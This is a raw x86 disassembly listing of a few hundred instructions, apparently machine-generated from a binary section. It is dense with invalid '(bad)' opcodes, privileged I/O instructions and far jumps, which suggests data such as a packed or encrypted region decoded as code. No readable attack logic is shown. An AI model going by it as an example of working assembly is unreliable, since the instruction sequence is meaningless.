  41fc4c:	add    al,0x18
  41fc4e:	pop    ebp
  41fc4f:	cmc    
  41fc50:	push   ss
  41fc51:	xlat   BYTE PTR ds:[ebx]
  41fc52:	jae    0x41fc2f
  41fc54:	xor    BYTE PTR [ecx],ah
  41fc56:	push   edi
  41fc57:	pop    ebx
  41fc58:	or     al,0xd3
  41fc5a:	hlt    
  41fc5b:	loope  0x41fcc3
  41fc5d:	mov    ecx,0x4243e1d7
  41fc62:	cmc    
  41fc63:	mov    ah,0xf5
  41fc65:	in     al,dx
  41fc66:	dec    eax
  41fc67:	cdq    
  41fc68:	mov    al,ds:0xf251f4cf
  41fc6d:	mov    bl,0x75
  41fc6f:	pop    esi
  41fc70:	scas   eax,DWORD PTR es:[edi]
  41fc71:	(bad)  
  41fc72:	lds    edx,FWORD PTR [eax+0x33]
  41fc75:	js     0x41fcd9
  41fc77:	pop    ss
  41fc78:	shr    BYTE PTR [esi+edi*2+0x49417fef],0x33
  41fc80:	adc    edx,DWORD PTR cs:[edi-0x72]
  41fc84:	jl     0x41fce8
  41fc86:	nop
  41fc87:	xor    al,0xd5
  41fc89:	dec    esi
  41fc8a:	mov    bh,0x34
  41fc8c:	loopne 0x41fcac
  41fc8e:	xchg   ebx,eax
  41fc8f:	test   eax,0x5f3e960d
  41fc94:	xchg   ebp,eax
  41fc95:	pop    ss
  41fc96:	fdivr  st,st(5)
  41fc98:	xor    edx,DWORD PTR [eax+eiz*2-0x54]
  41fc9c:	out    0x2c,al
  41fc9e:	sub    ah,dh
  41fca0:	or     al,0x0
  41fca2:	repz loopne 0x41fc69
  41fca5:	cmp    DWORD PTR [ecx],esp
  41fca7:	fbld   TBYTE PTR [ebp-0x792e54bf]
  41fcad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcae:	push   ebx
  41fcaf:	repz mov edi,0x27d4ec3f
  41fcb5:	je     0x41fd10
  41fcb7:	idiv   bl
  41fcb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcba:	retf   0x3b66
  41fcbd:	mov    ebp,0xa60bff53
  41fcc2:	inc    ecx
  41fcc3:	or     bh,bl
  41fcc5:	cmovb  ebp,DWORD PTR [esi+0x41]
  41fcc9:	(bad)  
  41fcca:	or     eax,0x8a77fb3e
  41fccf:	je     0x41fd02
  41fcd1:	call   0x1cdc9f00
  41fcd6:	rcl    edx,cl
  41fcd8:	push   esp
  41fcd9:	test   DWORD PTR [edi+0x60],esi
  41fcdc:	das    
  41fcdd:	adc    al,0xa7
  41fcdf:	sbb    BYTE PTR [esi+0x56],dh
  41fce2:	inc    esi
  41fce3:	dec    ebp
  41fce4:	icebp  
  41fce5:	dec    edx
  41fce6:	inc    esi
  41fce7:	dec    eax
  41fce8:	daa    
  41fce9:	mov    dl,0x27
  41fceb:	push   es
  41fcec:	push   ss
  41fced:	and    bl,BYTE PTR [ebp+0x4f]
  41fcf0:	push   esi
  41fcf1:	xor    BYTE PTR [edi],dh
  41fcf3:	in     al,0x94
  41fcf5:	mov    bl,0x12
  41fcf7:	and    BYTE PTR [edi+edx*1],bh
  41fcfa:	jecxz  0x41fd10
  41fcfc:	pop    ebp
  41fcfd:	push   ecx
  41fcfe:	xor    al,0x37
  41fd00:	cld    
  41fd01:	and    al,0x94
  41fd03:	lods   eax,DWORD PTR ds:[esi]
  41fd04:	cld    
  41fd05:	xacquire xchg DWORD PTR [edx],edx
  41fd08:	push   ebp
  41fd09:	jecxz  0x41fd6e
  41fd0b:	add    DWORD PTR [ecx-0x2b],0x2f29ca6d
  41fd12:	mov    edi,0x5c0dfc60
  41fd17:	in     eax,0xa
  41fd19:	jne    0x41fd3b
  41fd1b:	jae    0x41fd43
  41fd1d:	sbb    ebp,DWORD PTR [edx]
  41fd1f:	dec    ebp
  41fd20:	xchg   edi,eax
  41fd21:	adc    edx,eax
  41fd23:	push   ds
  41fd24:	jno    0x41fd90
  41fd26:	mov    ecx,0x97225f1d
  41fd2b:	or     cl,BYTE PTR [esi]
  41fd2d:	aaa    
  41fd2e:	daa    
  41fd2f:	lock sub DWORD PTR [eax-0x68],esp
  41fd33:	arpl   WORD PTR [edx+0x35],sp
  41fd36:	inc    ebp
  41fd37:	jb     0x41fd6b
  41fd39:	fcomp  DWORD PTR [ecx-0x596b7d65]
  41fd3f:	and    edx,eax
  41fd41:	add    esi,DWORD PTR [eax]
  41fd43:	cmp    al,0xf8
  41fd45:	xchg   esp,eax
  41fd46:	or     eax,0xf4182cf5
  41fd4b:	cmp    dl,BYTE PTR [edx-0x32]
  41fd4e:	ds pop ds
  41fd50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd51:	call   0x2a03905f
  41fd56:	ss ja  0x41fd82
  41fd59:	mov    ebx,0x4f4fd50d
  41fd5e:	dec    eax
  41fd5f:	cmp    bl,BYTE PTR ds:0xe4e157f2
  41fd65:	ja     0x41fda7
  41fd67:	fild   WORD PTR [edi]
  41fd69:	jmp    0x720e36df
  41fd6e:	ins    DWORD PTR es:[edi],dx
  41fd6f:	pop    esi
  41fd70:	mov    dh,0xf7
  41fd72:	xchg   ebp,eax
  41fd73:	ja     0x41fd5c
  41fd75:	mov    BYTE PTR [edi],dh
  41fd77:	pop    esi
  41fd78:	sti    
  41fd79:	retf   0xc686
  41fd7c:	push   es
  41fd7d:	rcr    BYTE PTR [esp+edi*4+0x53],cl
  41fd81:	ins    DWORD PTR es:[edi],dx
  41fd82:	and    dl,al
  41fd84:	jb     0x41fd7d
  41fd86:	mov    al,ds:0x512f9eeb
  41fd8b:	xchg   BYTE PTR [eax+eiz*1-0x69],bh
  41fd8f:	jmp    0x41fd36
  41fd91:	sub    eax,0x754dc85c
  41fd96:	mov    es,WORD PTR [eax-0x6bdba8e5]
  41fd9c:	xchg   edx,eax
  41fd9d:	pop    esi
  41fd9e:	icebp  
  41fd9f:	cmp    al,0x2d
  41fda1:	and    eax,0xffffff9f
  41fda4:	add    BYTE PTR ds:0xf7ff629,bh
  41fdaa:	nop
  41fdab:	or     DWORD PTR [edi],eax
  41fdad:	test   BYTE PTR [edi+edx*1],ah
  41fdb0:	pop    ebx
  41fdb1:	icebp  
  41fdb2:	sub    BYTE PTR [esi-0x6f20de20],0xa1
  41fdb9:	shr    DWORD PTR [edi],1
  41fdbb:	jne    0x41fd95
  41fdbd:	cs mov ecx,0x7d8184ca
  41fdc3:	jg     0x41fdee
  41fdc5:	outs   dx,DWORD PTR ds:[esi]
  41fdc6:	and    esi,ebx
  41fdc8:	loopne 0x41fdb4
  41fdca:	sub    dh,bh
  41fdcc:	sahf   
  41fdcd:	adc    DWORD PTR [ebp+0x47d0f64],ebp
  41fdd3:	mov    al,0x67
  41fdd5:	cmc    
  41fdd6:	out    dx,eax
  41fdd7:	mov    ds:0x77c03ded,eax
  41fddc:	sub    ch,BYTE PTR [ecx+esi*1-0x456b0fbe]
  41fde3:	addr16 sub eax,0x40795ab5
  41fde9:	inc    edi
  41fdea:	aaa    
  41fdeb:	inc    ebx
  41fdec:	stos   DWORD PTR es:[edi],eax
  41fded:	sub    al,0x2a
  41fdef:	push   edx
  41fdf0:	imul   eax,ebx,0xc8cf8e1a
  41fdf6:	push   ebx
  41fdf7:	jae    0x41fda7
  41fdf9:	mov    eax,0x7a3cb8c4
  41fdfe:	sbb    bh,BYTE PTR [ebp-0x31]
  41fe01:	loope  0x41fe3d
  41fe03:	add    eax,0x14d54c5d
  41fe08:	jg     0x41fdcb
  41fe0a:	jmp    0x41fe80
  41fe0c:	jno    0x41fd8e
  41fe0e:	add    esp,DWORD PTR [edi]
  41fe10:	push   esi
  41fe11:	mov    eax,0xd619904f
  41fe16:	jbe    0x41fe20
  41fe18:	mov    BYTE PTR [esi-0x91b25a5],bl
  41fe1e:	push   esi
  41fe1f:	xchg   edx,eax
  41fe20:	out    dx,eax
  41fe21:	inc    eax
  41fe22:	pusha  
  41fe23:	fdivr  st(5),st
  41fe25:	dec    ecx
  41fe26:	in     eax,dx
  41fe27:	adc    esp,DWORD PTR [edx+0x2cbd628c]
  41fe2d:	jecxz  0x41fde3
  41fe2f:	shl    BYTE PTR [eax-0x51],cl
  41fe32:	and    dl,al
  41fe34:	push   ds
  41fe35:	mov    eax,ds:0x44fa4319
  41fe3a:	push   eax
  41fe3b:	inc    ebp
  41fe3c:	into   
  41fe3d:	aas    
  41fe3e:	mov    edi,?
  41fe40:	sbb    DWORD PTR [edx+0x72074189],ebp
  41fe46:	frstor ds:[eax]
  41fe49:	sub    dh,BYTE PTR [edi+0x403f01dd]
  41fe4f:	adc    ah,cl
  41fe51:	mov    bh,0x1b
  41fe53:	stc    
  41fe54:	push   ebx
  41fe55:	jne    0x41fe6c
  41fe57:	loop   0x41fe37
  41fe59:	aam    0x4f
  41fe5b:	lods   al,BYTE PTR ds:[esi]
  41fe5c:	or     edx,DWORD PTR [eax]
  41fe5e:	stos   BYTE PTR es:[edi],al
  41fe5f:	lock pavgb mm4,mm3
  41fe63:	mov    edx,0x13084661
  41fe68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe69:	sbb    BYTE PTR [edx],0xb4
  41fe6c:	push   ss
  41fe6d:	pop    ss
  41fe6e:	mov    cl,0xcc
  41fe70:	mov    cs,WORD PTR [ebx-0x51598e5c]
  41fe76:	into   
  41fe77:	push   es
  41fe78:	jp     0x41fea2
  41fe7a:	xchg   ebx,eax
  41fe7b:	pop    eax
  41fe7c:	add    cl,ah
  41fe7e:	sbb    eax,0xf89c04b3
  41fe83:	and    WORD PTR [ebx-0x3e2227d6],bp
  41fe8a:	mov    eax,0xa5aee6bd
  41fe8f:	inc    eax
  41fe90:	dec    ebx
  41fe91:	dec    ecx
  41fe92:	jg     0x41fe67
  41fe94:	xor    dl,bl
  41fe96:	sub    DWORD PTR [esi+0x6f67729b],edx
  41fe9c:	repz adc ah,BYTE PTR [eax+0x51ce41a]
  41fea3:	jle    0x41ff18
  41fea5:	mov    bh,BYTE PTR [ebp+0x20]
  41fea8:	arpl   WORD PTR [ecx+ebx*8+0x59],dx
  41feac:	mul    BYTE PTR ds:0xc8daa306
  41feb2:	(bad)  
  41feb3:	cli    
  41feb4:	push   esp
  41feb5:	in     eax,0xcd
  41feb7:	mov    edx,0x51119292
  41febc:	ror    BYTE PTR [esp+ebx*4-0x7e69024f],1
  41fec3:	inc    ebp
  41fec4:	mov    ebp,0x759b476b
  41fec9:	pushf  
  41feca:	add    cl,BYTE PTR [ebp+0x10]
  41fecd:	popf   
  41fece:	push   edx
  41fecf:	xchg   DWORD PTR [ebp-0x4c2f9520],edx
  41fed5:	and    al,0x57
  41fed7:	stc    
  41fed8:	push   0xffffffa3
  41feda:	add    DWORD PTR [esp+eiz*4+0x1c],0x50332116
  41fee2:	call   0xe5c4a5b4
  41fee7:	or     esp,DWORD PTR [ebx-0x23]
  41feea:	mov    ds:0x59140ee5,eax
  41fef0:	push   cs
  41fef1:	test   DWORD PTR [ebx+0x15],ebx
  41fef4:	aam    0x21
  41fef6:	jns    0x41ff47
  41fef8:	sub    al,0x29
  41fefa:	dec    esp
  41fefb:	dec    ebp
  41fefc:	mov    ecx,0x75c4e9b7
  41ff01:	test   esi,edi
  41ff03:	ds jb  0x41ff42
  41ff06:	inc    esi
  41ff07:	push   edx
  41ff08:	add    al,0xc
  41ff0a:	clc    
  41ff0b:	lock add edi,DWORD PTR [edi-0x7f]
  41ff0f:	xchg   esp,eax
  41ff10:	sbb    dh,cl
  41ff12:	sbb    ebx,DWORD PTR [ebx-0x79]
  41ff15:	(bad)  
  41ff16:	ins    BYTE PTR es:[edi],dx
  41ff17:	xchg   ebp,eax
  41ff18:	adc    bl,BYTE PTR [edi-0x75ec4a2d]
  41ff1e:	outs   dx,DWORD PTR ds:[esi]
  41ff1f:	loop   0x41fec6
  41ff21:	lahf   
  41ff22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff23:	xor    DWORD PTR [eax+0x10],0xcf67f020
  41ff2a:	rol    DWORD PTR [edi-0x26],1
  41ff2d:	push   eax
  41ff2e:	push   edx
  41ff2f:	or     dh,cl
  41ff31:	bound  eax,QWORD PTR [edi-0x42917a60]
  41ff37:	or     ah,dh
  41ff39:	adc    eax,DWORD PTR [ecx]
  41ff3b:	inc    eax
  41ff3c:	loop   0x41ff85
  41ff3e:	pop    ds
  41ff3f:	sti    
  41ff40:	scas   al,BYTE PTR es:[edi]
  41ff41:	add    DWORD PTR fs:[ebx-0x2a],edi
  41ff45:	inc    ebp
  41ff46:	xor    dl,BYTE PTR [ecx-0x6f587770]
  41ff4c:	dec    ecx
  41ff4d:	add    BYTE PTR [edi+0x2f66d3c],bl
  41ff53:	das    
  41ff54:	fsubr  DWORD PTR [esi-0x7a]
  41ff57:	arpl   bp,di
  41ff59:	mov    bh,0xc0
  41ff5b:	inc    ecx
  41ff5c:	jno    0x41ff02
  41ff5e:	cmp    DWORD PTR ds:0xf6d35a39,ecx
  41ff64:	stos   BYTE PTR es:[edi],al
  41ff65:	mov    ds:0x16e45ddf,eax
  41ff6a:	mov    BYTE PTR [esi-0x5a],0xe5
  41ff6e:	xchg   dl,dl
  41ff70:	mov    ebx,0xa5c0805a
  41ff75:	inc    ebp
  41ff76:	mov    eax,ds:0x62d8f2e0
  41ff7b:	jnp    0x41ff7d
  41ff7d:	div    BYTE PTR [edx-0x62]
  41ff80:	in     al,dx
  41ff81:	fs mov ebp,0xb1ac412e
  41ff87:	or     bh,bh
  41ff89:	mov    ds:0x5f0b0d87,al
  41ff8e:	rcl    BYTE PTR [eax],0x8
  41ff91:	lea    ebx,[ecx-0x47e18029]
  41ff97:	sbb    DWORD PTR [ecx+edi*8+0x64],0xad99df1f
  41ff9f:	inc    esi
  41ffa0:	cs mov esi,0x3604abf8
  41ffa6:	mov    ds:0x2649d159,al
  41ffab:	add    al,0xb2
  41ffad:	xor    ebx,DWORD PTR [ebx-0x3f]
  41ffb0:	adc    bh,BYTE PTR [ebp+0x26]
  41ffb3:	call   0xccf72e73
  41ffb8:	daa    
  41ffb9:	xor    eax,0xaa0682d2
  41ffbe:	xchg   ebx,eax
  41ffbf:	hlt    
  41ffc0:	dec    ebp
  41ffc1:	or     dh,0xd3
  41ffc4:	sahf   
  41ffc5:	cmc    
  41ffc6:	je     0x420042
  41ffc8:	pusha  
  41ffc9:	mov    DWORD PTR cs:[ebx+0xd0c7200],edi
  41ffd0:	push   ebx
  41ffd1:	bound  ebp,QWORD PTR [edx-0x3c14662b]
  41ffd7:	add    esi,DWORD PTR [edi]
  41ffd9:	pop    edx
  41ffda:	lods   eax,DWORD PTR ds:[esi]
  41ffdb:	(bad)  
  41ffdc:	lahf   
  41ffdd:	test   DWORD PTR [ebp-0x67084df8],edx
  41ffe3:	call   0x22a8:0xda8f6e27
  41ffea:	popa   
  41ffeb:	fld    TBYTE PTR [edx+0xe]
  41ffee:	or     DWORD PTR [esi],ebp
  41fff0:	cwde   
  41fff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fff2:	aas    
  41fff3:	push   0xfffffff8
  41fff5:	or     BYTE PTR ds:0x222b7d3d,dh
  41fffb:	or     esp,DWORD PTR [ecx]
  41fffd:	cmp    cl,bl
  41ffff:	cmp    cl,ah
  420001:	xor    eax,0x548f4a87
  420006:	hlt    
  420007:	push   esi
  420008:	and    eax,0x9a25f1be
  42000d:	inc    ecx
  42000e:	adc    ebp,ebx
  420010:	xor    ch,BYTE PTR [ebx+0x78]
  420013:	mov    esi,0xb0b9fb0
  420018:	push   eax
  420019:	aad    0x9f
  42001b:	aam    0x7b
  42001d:	pop    esp
  42001e:	jb     0x42004c
  420020:	cmp    bl,BYTE PTR [ebx]
  420022:	sub    eax,DWORD PTR [ebp-0x4359a970]
  420028:	retf   0x445
  42002b:	adc    BYTE PTR [edi],dl
  42002d:	lds    esi,FWORD PTR ss:[eax]
  420030:	mov    ds:0xe6aeeb84,al
  420035:	push   0xc2012bab
  42003a:	push   edx
  42003b:	arpl   sp,si
  42003d:	arpl   WORD PTR [edi+0x12],bx
  420040:	mov    esi,ebp
  420042:	shl    DWORD PTR [ebx],0xac
  420045:	inc    esi
  420046:	or     al,0xab
  420048:	stos   DWORD PTR es:[edi],eax
  420049:	inc    esp
  42004a:	mov    esi,0xfc2dc239
  42004f:	rcr    BYTE PTR [edx],0xee
  420052:	push   ss
  420053:	adc    DWORD PTR [eax-0x4a],edi
  420056:	add    DWORD PTR [ebx-0x3ac44831],0x5b
  42005d:	fisub  DWORD PTR ds:0x7ddef5f0
  420063:	mov    ah,0xd3
  420065:	mov    BYTE PTR [ecx+ebp*4-0x61b75263],al
  42006c:	adc    eax,0x58c41c87
  420071:	mov    gs,WORD PTR [ecx-0x6fcc981]
  420077:	addr16 pop edx
  420079:	out    0xad,eax
  42007b:	cdq    
  42007c:	cmp    al,0xcc
  42007e:	out    dx,al
  42007f:	fistp  DWORD PTR [eax]
  420081:	pop    ecx
  420082:	aaa    
  420083:	retf   0xe08a
  420086:	dec    ebp
  420087:	cmp    al,0x11
  420089:	outs   dx,DWORD PTR ds:[esi]
  42008a:	push   ebp
  42008b:	rcr    DWORD PTR [ecx-0x24],cl
  42008e:	mov    al,ds:0xf2be999c
  420093:	mov    BYTE PTR [edx-0x76],al
  420096:	cdq    
  420097:	jmp    0x125a:0x83f7dbd1
  42009e:	cmp    esp,esi
  4200a0:	xor    al,0x5a
  4200a2:	popf   
  4200a3:	xchg   ecx,eax
  4200a4:	xchg   BYTE PTR [ebp-0x32],bl
  4200a7:	(bad)  
  4200a8:	or     edi,DWORD PTR [esi]
  4200aa:	in     al,dx
  4200ab:	cmp    al,0xa0
  4200ad:	cwde   
  4200ae:	jb     0x4200d5
  4200b0:	shl    BYTE PTR [esi+ebp*4],cl
  4200b3:	loopne 0x42005a
  4200b5:	outs   dx,DWORD PTR ds:[esi]
  4200b6:	cs addr16 test al,0x12
  4200ba:	push   cs
  4200bb:	popa   
  4200bc:	std    
  4200bd:	fild   QWORD PTR [edi-0x7d6bde8c]
  4200c3:	inc    eax
  4200c4:	retf   0xecc9
  4200c7:	aaa    
  4200c8:	(bad)  
  4200c9:	xchg   esp,eax
  4200ca:	ins    DWORD PTR es:[edi],dx
  4200cb:	loope  0x4200e6
  4200cd:	jae    0x42013d
  4200cf:	(bad)  
  4200d0:	push   ss
  4200d1:	fld    DWORD PTR [eax-0x60]
  4200d4:	mul    DWORD PTR [ebx-0x4e92a184]
  4200da:	fs stc 
  4200dc:	or     edx,DWORD PTR [ebp+edi*2+0x2e10eb9b]
  4200e3:	ja     0x420127
  4200e5:	mov    edi,0x8f586a03
  4200ea:	mov    al,0x5b
  4200ec:	push   ebx
  4200ed:	int3   
  4200ee:	lds    ecx,FWORD PTR ds:0x5a2437ed
  4200f4:	inc    edx
  4200f5:	mov    ecx,0x320cd8ba
  4200fa:	adc    dl,0x6b
  4200fd:	scas   eax,DWORD PTR es:[edi]
  4200fe:	stos   BYTE PTR es:[edi],al
  4200ff:	fucomip st,st(1)
  420101:	mov    ecx,0x3004fa92
  420106:	cmp    cl,BYTE PTR [esi+esi*8]
  420109:	test   DWORD PTR [esi+0x4b02a6c1],ebp
  42010f:	(bad)  
  420110:	inc    edx
  420112:	mov    eax,ds:0x22e10d8b
  420117:	mov    cl,0xdf
  420119:	push   0x49
  42011b:	adc    bh,ah
  42011d:	call   0xdd7f:0x140d9723
  420124:	ins    DWORD PTR es:[edi],dx
  420125:	in     al,0x9c
  420127:	adc    al,0xe
  420129:	xchg   esp,eax
  42012a:	fadd   DWORD PTR [ecx+0x5bcd9884]
  420130:	mov    ss,WORD PTR [ecx]
  420132:	stc    
  420133:	lods   al,BYTE PTR ds:[esi]
  420134:	dec    ebx
  420135:	add    ecx,DWORD PTR [ecx]
  420137:	push   ss
  420138:	daa    
  420139:	jmp    0x5489:0xb46736e9
  420140:	dec    eax
  420141:	out    0x4b,eax
  420143:	add    al,0x2
  420145:	(bad)  
  420146:	fisttp DWORD PTR [edx+0x1a6eb467]
  42014c:	mov    DWORD PTR [edx-0x7b],ecx
  42014f:	ret    0xa818
  420152:	xor    ebp,DWORD PTR [ecx+ebp*8-0x6dc03614]
  420159:	test   dl,ah
  42015b:	mov    dh,0xa4
  42015d:	xchg   BYTE PTR [ebp+esi*4+0x33],dh
  420161:	lea    ecx,[edi-0x3f246fc9]
  420167:	sbb    esi,0x631b52f0
  42016d:	int    0xae
  42016f:	int    0x68
  420171:	lea    ebx,[esi]
  420173:	adc    bl,BYTE PTR [esi]
  420175:	mov    ecx,0x39c613e
  42017a:	call   0x3e6a0c9a
  42017f:	mov    WORD PTR [ecx],gs
  420181:	jae    0x4201bf
  420183:	imul   ebp,DWORD PTR [edi],0xb964aaa7
  420189:	lds    bp,DWORD PTR [edx+0x5e051b28]
  420190:	sar    BYTE PTR [ebx-0x3c],1
  420193:	mov    DWORD PTR [esi+0x3],edi
  420196:	sub    dh,al
  420198:	mov    edi,?
  42019a:	mov    dh,0x5d
  42019c:	cwde   
  42019d:	push   eax
  42019e:	pushf  
  42019f:	shl    DWORD PTR [ecx-0x768c229a],cl
  4201a5:	sub    ah,BYTE PTR ds:[esi+0x5439ae88]
  4201ac:	popf   
  4201ad:	sub    eax,0x9bbbc002
  4201b2:	and    al,0x66
  4201b4:	adc    eax,DWORD PTR [eax]
  4201b6:	stos   BYTE PTR es:[edi],al
  4201b7:	cli    
  4201b8:	in     eax,dx
  4201b9:	mov    DWORD PTR [edx+eax*2+0x5d281759],edx
  4201c0:	outs   dx,DWORD PTR ds:[esi]
  4201c1:	adc    BYTE PTR [ebp+0x778eaae6],0xfc
  4201c8:	or     ecx,esi
  4201ca:	mov    al,0x91
  4201cc:	sub    al,0xf6
  4201ce:	fstp   DWORD PTR [edi]
  4201d0:	call   0xb70e:0x7abfc0bc
  4201d7:	clc    
  4201d8:	ud0    esp,edx
  4201db:	in     al,dx
  4201dc:	xor    BYTE PTR [esi+0x2dca7b1a],0xb8
  4201e3:	dec    edi
  4201e4:	xchg   BYTE PTR [esp+eiz*8+0x1],ah
  4201e8:	dec    bx
  4201ea:	xor    BYTE PTR [esi+0x772b9fe7],0x35
  4201f1:	imul   esp,DWORD PTR [eax-0x47],0x8edaa7d5
  4201f8:	fwait
  4201f9:	xor    eax,0x3dfb030e
  4201fe:	jbe    0x4201e4
  420200:	sub    edi,esp
  420202:	pop    edx
  420203:	sub    BYTE PTR [esi-0x834ca33],ch
  420209:	jno    0x4201e2
  42020b:	lahf   
  42020c:	mov    dh,0x2e
  42020e:	and    al,ch
  420210:	pop    ss
  420211:	pop    ebx
  420212:	push   ds
  420213:	bnd js 0x4201fc
  420216:	sbb    DWORD PTR [eax],eax
  420218:	jecxz  0x4201a0
  42021a:	xchg   ebx,eax
  42021b:	pop    ebp
  42021c:	lea    ecx,[esi-0x3c]
  42021f:	push   esp
  420220:	inc    edi
  420221:	mov    eax,0x8a1d7bc0
  420226:	sub    esi,eax
  420228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420229:	add    BYTE PTR [edi],cl
  42022b:	mov    dh,0x67
  42022d:	retf   
  42022e:	icebp  
  42022f:	lahf   
  420230:	mov    esi,0x6b403939
  420235:	xchg   ebx,eax
  420236:	dec    eax
  420237:	fwait
  420238:	out    0x73,al
  42023a:	sbb    esi,DWORD PTR [esi+eax*4]
  42023d:	xor    ch,ch
  42023f:	add    BYTE PTR [ecx+0x19],dh
  420242:	jo     0x42024b
  420244:	popf   
  420245:	mov    ds:0xbdfd28c,eax
  42024a:	mov    ch,0x6
  42024c:	outs   dx,BYTE PTR ds:[esi]
  42024d:	xchg   esp,eax
  42024e:	push   edi
  42024f:	sub    esi,DWORD PTR [ebx]
  420251:	repnz add dl,BYTE PTR [eax]
  420254:	jns    0x420289
  420256:	ret    
  420257:	push   0xa0384fb9
  42025c:	rcr    ebp,0x1e
  42025f:	cs xchg ecx,eax
  420261:	in     al,0x31
  420263:	test   al,0x5c
  420265:	pushf  
  420266:	inc    edi
  420267:	jl     0x420223
  420269:	ins    DWORD PTR es:[edi],dx
  42026a:	or     al,0xb5
  42026c:	repnz push ebp
  42026e:	lods   al,BYTE PTR ds:[esi]
  42026f:	aad    0xc7
  420271:	jge    0x4202c6
  420273:	loope  0x4201ff
  420275:	es scas al,BYTE PTR es:[edi]
  420277:	xchg   esp,eax
  420278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420279:	jg     0x420289
  42027b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42027c:	enter  0x9b1,0x18
  420280:	stos   DWORD PTR es:[edi],eax
  420281:	stc    
  420282:	push   es
  420283:	jecxz  0x42026a
  420285:	inc    ecx
  420286:	xor    BYTE PTR [esi+ebp*8],dh
  420289:	adc    eax,0x38f543df
  42028e:	or     DWORD PTR [ebp+0x6ceb9c75],ecx
  420294:	xor    al,ah
  420296:	fisubr WORD PTR [edx+ebp*2]
  420299:	mov    edx,0xfdd86b31
  42029e:	mov    ecx,0x887701e9
  4202a3:	or     ch,BYTE PTR [ebp+0x42]
  4202a6:	push   ecx
  4202a7:	pop    ss
  4202a8:	out    dx,eax
  4202a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202aa:	test   ah,bl
  4202ac:	or     ch,BYTE PTR es:[eax]
  4202af:	mov    DWORD PTR [esi+0x62220fc8],esp
  4202b5:	adc    BYTE PTR [esi-0x7113bfc7],0x71
  4202bc:	mov    ebx,0x2d262d70
  4202c1:	pop    esi
  4202c2:	xchg   edi,eax
  4202c3:	(bad)  
  4202c4:	xlat   BYTE PTR ds:[ebx]
  4202c5:	mov    cl,0x3a
  4202c7:	xor    BYTE PTR [ebx+0x57d6d13e],cl
  4202cd:	daa    
  4202ce:	lock xor eax,DWORD PTR [ecx+ecx*4-0x26]
  4202d3:	or     al,BYTE PTR [edi+edx*8-0x3e1a0b89]
  4202da:	inc    ebx
  4202db:	pop    ecx
  4202dc:	aaa    
  4202dd:	(bad)  
  4202de:	test   al,0xa2
  4202e0:	adc    ch,BYTE PTR [eax]
  4202e2:	or     al,BYTE PTR [esi]
  4202e4:	mov    ecx,0xd2d30797
  4202e9:	add    dh,bl
  4202eb:	ret    
  4202ec:	pop    esi
  4202ed:	aam    0x7d
  4202ef:	loop   0x42036d
  4202f1:	push   es
  4202f2:	das    
  4202f3:	pushf  
  4202f4:	adc    ecx,DWORD PTR [esi+0x79a40664]
  4202fa:	mov    bl,0x9c
  4202fc:	xor    edx,DWORD PTR [edx+0x1376cef5]
  420302:	pushf  
  420303:	dec    ecx
  420304:	out    0xe5,eax
  420306:	pop    edi
  420307:	inc    eax
  420308:	push   0xffffffc0
  42030a:	xchg   BYTE PTR [eax],dl
  42030c:	pop    edx
  42030d:	retf   
  42030e:	push   ss
  42030f:	add    al,0xbe
  420311:	mov    dh,dl
  420313:	mov    esp,edi
  420315:	fdivr  st,st(5)
  420317:	lds    esp,FWORD PTR [ecx+ecx*8+0x31]
  42031b:	sub    DWORD PTR [ebp+0xe05217b],0x1e
  420322:	rol    DWORD PTR [eax],0xdc
  420325:	jnp    0x4202fe
  420327:	and    bl,ch
  420329:	mov    edi,DWORD PTR [eax]
  42032b:	adc    DWORD PTR [edx+0x676ada8e],edi
  420331:	mov    eax,ds:0x33d8d121
  420336:	mov    ecx,0x1aa87254
  42033b:	or     eax,0xab3a60a6
  420340:	or     ch,BYTE PTR [ecx]
  420342:	jb     0x4202e6
  420344:	mov    ecx,0xc60d0dc3
  420349:	retfw  
  42034b:	outs   dx,DWORD PTR ds:[esi]
  42034c:	xchg   edi,eax
  42034d:	ins    BYTE PTR es:[edi],dx
  42034e:	and    DWORD PTR [ebp+0x1b944b18],0xffffffb8
  420355:	adc    edi,DWORD PTR [esi-0x55f455b4]
  42035b:	cs adc bl,BYTE PTR ss:[ebx+0x276dc3bf]
  420363:	out    0xc2,eax
  420365:	jl     0x4203a6
  420367:	and    al,0xd1
  420369:	imul   ecx,edx,0x53cc6cbe
  42036f:	mov    eax,fs
  420371:	jle    0x420360
  420373:	xor    BYTE PTR [edi+esi*1],al
  420376:	ds push ss
  420378:	jne    0x42030a
  42037a:	fadd   QWORD PTR [esi]
  42037c:	ss (bad) 
  42037e:	pusha  
  42037f:	sub    BYTE PTR [esp+edi*4+0x7f0b6900],cl
  420386:	cmp    al,0xc9
  420388:	ins    BYTE PTR es:[edi],dx
  420389:	or     DWORD PTR [ebp+0x7febb8f7],edx
  42038f:	and    al,0x6b
  420391:	sbb    ah,dl
  420393:	mov    bl,0xf1
  420395:	jno    0x4203af
  420397:	add    BYTE PTR [ecx+0x22d06545],al
  42039d:	and    esp,DWORD PTR [edi-0x46a1d888]
  4203a3:	cld    
  4203a4:	in     al,0x5c
  4203a6:	push   ebp
  4203a7:	call   0xd01a619c
  4203ac:	adc    eax,0xd04e9ccf
  4203b1:	aad    0xbc
  4203b3:	cli    
  4203b4:	mov    bh,0x84
  4203b6:	mov    bh,0xd5
  4203b8:	pop    ss
  4203b9:	mov    BYTE PTR [ebp+0x3b46b4a3],dl
  4203bf:	imul   ecx,DWORD PTR [ecx-0x6898c442],0x53
  4203c6:	and    eax,0x7552c86a
  4203cb:	pop    ss
  4203cc:	pop    ds
  4203cd:	inc    BYTE PTR [edi-0x27e98d7d]
  4203d3:	nop
  4203d4:	rcl    edi,0x8d
  4203d7:	js     0x4203c4
  4203d9:	add    eax,0xdd8e10df
  4203de:	or     al,bh
  4203e0:	xchg   DWORD PTR [edx-0x44262484],ebx
  4203e6:	cdq    
  4203e7:	xchg   ecx,eax
  4203e8:	pushf  
  4203e9:	test   al,0xb
  4203eb:	xlat   BYTE PTR ds:[ebx]
